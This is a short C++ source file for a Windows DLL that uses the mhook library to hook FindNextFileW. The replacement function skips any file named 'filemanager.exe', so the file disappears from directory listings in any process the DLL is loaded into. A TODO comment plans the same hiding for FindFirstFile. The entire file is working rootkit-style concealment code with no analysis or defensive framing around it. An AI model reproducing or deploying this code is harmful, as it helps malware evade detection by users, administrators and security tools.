// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <mhook-lib/mhook.h>

const wchar_t* HIDDEN = L"filemanager.exe";

typedef BOOL(WINAPI* PFNF)(
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAW lpFindFileData
    );

PFNF OriginalFindNextFileW = (PFNF)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FindNextFileW");

BOOL WINAPI FindNextFileHooked(
    _In_ HANDLE file_handle,
    _Out_ LPWIN32_FIND_DATAW file_struct
)
{
    BOOL success;
    do {
        success = OriginalFindNextFileW(file_handle, file_struct);
    } while (success && !wcscmp(HIDDEN, file_struct->cFileName)); //TODO:  also hide in FindFirstFile
    return success;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Mhook_SetHook((PVOID*) &OriginalFindNextFileW, FindNextFileHooked);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

